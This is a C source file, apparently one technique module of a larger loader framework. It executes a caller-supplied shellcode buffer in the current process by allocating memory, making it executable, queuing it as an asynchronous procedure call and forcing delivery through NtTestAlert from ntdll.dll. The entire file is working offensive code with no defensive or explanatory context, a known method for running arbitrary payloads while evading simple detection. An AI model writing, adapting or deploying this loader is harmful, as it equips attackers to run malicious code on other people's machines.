#include "../dispatch.h"

typedef LONG (NTAPI *fnNtTestAlert)(VOID);

BOOL tech_apc_self(unsigned char *sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    QueueUserAPC((PAPCFUNC)mem, GetCurrentThread(), 0);

    fnNtTestAlert NtTestAlert = (fnNtTestAlert)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtTestAlert");
    if (!NtTestAlert) return FALSE;
    NtTestAlert();
    return TRUE;
}
